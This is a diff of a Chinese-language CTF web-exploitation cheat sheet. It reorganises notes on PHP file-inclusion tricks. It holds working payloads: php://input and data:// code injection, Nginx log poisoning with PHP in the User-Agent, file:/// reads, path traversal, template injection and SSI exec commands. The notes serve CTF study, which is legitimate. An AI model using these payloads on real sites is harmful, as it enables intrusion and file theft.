@@ -886,6 +886,7 @@ GIF89a
 ##### 伪协议
 
 - 网页上显示的未必是真实源码，如果题目过滤了网页中代码没显示的字符，应该联想到网页中代码不真实。也许题目只过滤了 flag.php，并没有过滤 index.php
+- 当伪协议做不出来时，一定要想到 [Nginx 日志](######Nginx 日志文件，通过修改 User-Agent 执行 php 代码)
 
 ```
 问：PHP 中为什么 include('flag.php') 不显示内容，但是 include('php://filter/convert.base64-encode/resource=flag.php') 会显示内容？
@@ -979,8 +980,6 @@ http://xxx/?c=tac<fla%27%27g.php||
 # 等效于 ?c=tac<fla''g.php||    , Linux 在 tac 输出时会忽略 ''
 ```
 
-
-
 ###### GET 方法注入字符串到文件流
 将字符串 hello ctf 注入文件流 file
 
@@ -1003,6 +1002,40 @@ http://xxx/?file=data://text/plain,hello ctf
 http"//xxx/?file=php://input
 post data:<?php system("ls /"); ?>
 # 此处的 POST 只传字符串(不是键值对)
+```
+
+##### 直接访问服务器目录
+
+- 部分服务器会暴露本地路径，可以直接在 url 处构造路径访问
+
+###### Nginx 日志文件，通过修改 User-Agent 执行 php 代码
+
+如果 php://input 都被过滤，可以考虑此方法
+
+有时候题目代码没有明示，但测试下来 system() 等这些函数都用不了，则可以尝试该方法
+
+例如
+
+```
+访问 http://xxx/?file=/var/log/nginx/access.log
+修改 User-Agent 的值为 Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) <?php system('ls');?>Gecko/20100101 Firefox/56.0 
+# 此处会执行中间插入的代码 <?php system('ls');?> 。（可能要访问2次才会显示，结果可能返回在 html 源码中）
+```
+
+###### 文件协议
+
+> 用于url是重定向的情况
+
+```
+http://xxx/?url=file:///var/www/html/flag.php
+```
+
+###### include 函数的特性
+
+> 查找 ../../../../ffffllllaaaagggg 文件
+
+```
+http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
 ```
 
 ##### PHP SSIT 漏洞
@@ -1034,38 +1067,6 @@ data={if system('ls')}{/if}
 ```
 用户名 <!--#exec cmd="ls ../"-->
 密码 123123 (输入正确密码)
-```
-
-##### 直接访问服务器目录
-
-- 部分服务器会暴露本地路径，可以直接在 url 处构造路径访问
-
-###### Nginx 日志文件，通过修改 User-Agent 执行 php 代码
-
-如果 php://input 都被过滤，可以考虑此方法
-
-有时候题目代码没有明示，但测试下来 system() 等这些函数都用不了，则可以尝试该方法
-
-例如
-
-```
-访问 http://xxx/?file=/var/log/nginx/access.log
-修改 User-Agent 的值为 Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) <?php system('ls');?>Gecko/20100101 Firefox/56.0 
-# 此处会执行中间插入的代码 <?php system('ls');?> 。（可能要访问2次才会显示，结果可能返回在 html 源码中）
-```
-
-###### 文件协议
-
-> 用于url是重定向的情况
-```
-http://xxx/?url=file:///var/www/html/flag.php
-```
-
-###### include 函数的特性
-
-> 查找 ../../../../ffffllllaaaagggg 文件
-```
-http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
 ```
 
 ##### ThinkPHP 注入漏洞
